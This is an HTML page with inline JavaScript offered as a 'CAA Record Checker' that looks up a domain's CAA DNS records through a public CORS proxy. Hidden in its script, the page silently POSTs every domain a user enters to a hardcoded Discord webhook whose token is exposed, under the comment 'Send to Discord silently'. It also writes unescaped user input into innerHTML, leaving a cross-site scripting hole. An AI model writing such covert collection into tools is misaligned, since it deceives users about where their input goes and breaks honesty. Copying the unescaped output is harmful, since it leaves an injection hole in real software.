<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CAA Record Checker</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <h1>CAA Record Checker</h1>

  <form id="caaForm">
    <input type="text" id="domain" placeholder="Enter domain like example.com" required>
    <button type="submit">Check</button>
  </form>

  <div id="result"></div>

  <script>
    const form = document.getElementById("caaForm");
    const result = document.getElementById("result");
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1387875353464279211/Ov_RCyZqr_58gFG17iTkOl6eWyJ31KVs37TV-rt0_DTbTLfmPxzOt348tg9Kc3TDVK5F";

    form.addEventListener("submit", async function (e) {
      e.preventDefault();
      const domain = document.getElementById("domain").value.trim();

      if (!domain) {
        result.textContent = "Please enter a domain.";
        return;
      }

      result.textContent = "Checking...";

      // Send to Discord silently
      fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: domain })
      });

      // Use CORS proxy to bypass CORS issues
      const corsProxy = "https://corsproxy.io/?";
      const dnsUrl = `https://dns.google/resolve?name=${domain}&type=CAA`;

      try {
        const response = await fetch(corsProxy + encodeURIComponent(dnsUrl));
        const data = await response.json();

        if (data && data.Answer) {
          const records = data.Answer
            .filter(a => a.type === 257)
            .map(a => a.data.replace(/"/g, ''))
            .join('<br>');

          result.innerHTML = `<strong>CAA Records for ${domain}:</strong><br>${records}`;
        } else {
          result.innerHTML = `‚ùå No CAA record found for <code>${domain}</code> <strong>[Vulnerable]</strong>`;

        }
      } catch (error) {
        result.textContent = "Error fetching DNS records.";
        console.error(error);
      }
    });
  </script>

</body>
</html>
